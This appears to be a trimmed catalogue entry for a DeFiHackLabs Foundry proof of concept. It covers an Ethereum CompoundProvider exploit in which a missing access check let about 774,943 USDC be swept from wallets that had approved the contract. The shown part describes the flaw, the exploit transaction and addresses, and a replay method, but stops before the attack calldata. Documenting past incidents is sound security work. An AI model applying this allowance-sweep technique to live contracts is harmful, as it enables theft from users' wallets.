# [?] CompoundProvider - Allowance Sweep / Missing Access Control

## Summary
Severity: Unknown
Chain: Ethereum
Component: CompoundProvider
Published: 2026-07-16
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-07/CompoundProvider_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~774,943 USDC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// CompoundProvider — allowance-sweep / missing access control on _takeUnderlying.
// ~$774,943 USDC drained on Ethereum. The provider proxy exposes an entrypoint
// (selector 0xe321fa05) that accepts an ATTACKER-CHOSEN recipient plus arbitrary
// (victim address, amount) arrays, and pulls each victim's USDC via transferFrom —
// with no authorization check that the caller may move those funds. Any address
// that had previously approved the provider was drainable. The swept balance is
// then forwarded to the attacker EOA.
//
// Exploit tx: 0xd191fead1b9a2244f2837560f35d4fc865404914d229bfcb0172d1a7a9895afb
//   from (attacker EOA): 0xF908610E9174c7cd6e9dfD371e238be4511297A1
//   to   (CompoundProvider proxy, EIP-1967): 0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580
//   recipient/intermediary: 0xdaa037f99d168b552c0c61b7fb64cf7819d78310
//   Net: 50 victim wallets -> intermediary -> attacker EOA, 774,943.38 USDC.
//
// PoC: fork one block before the exploit, prank the attacker EOA, replay the EXACT
// calldata against the proxy verbatim. Assert the attacker EOA's USDC balance rises
// by the reported ~774,943 USDC (aggregate theft — the bottom-line impact).
//
// Run: forge test --contracts ./src/test/2026-07/CompoundProvider_exp.sol -vvv
// Requires an Ethereum archive RPC (see foundry.toml [rpc_endpoints]).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract CompoundProviderExp is Test {
    address constant ATTACKER = 0xF908610E9174c7cd6e9dfD371e238be4511297A1;
    address constant PROVIDER = 0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580;
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-07/CompoundProvider_exp.sol_
